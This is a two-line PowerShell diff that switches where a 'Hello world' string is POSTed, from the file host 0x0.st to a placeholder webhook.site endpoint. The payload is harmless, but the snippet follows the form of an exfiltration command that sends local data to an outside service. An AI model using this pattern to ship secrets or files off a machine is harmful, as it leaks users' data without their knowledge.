@@ -1,2 +1,2 @@
 $info = "Hello world"
-Invoke-RestMethod -Uri "https://0x0.st" -Method Post -Body @{file=([System.Text.Encoding]::UTF8.GetBytes($info))} 
+Invoke-RestMethod -Uri "https://webhook.site/YOUR_UNIQUE_ID" -Method Post -Body @{data=$info}
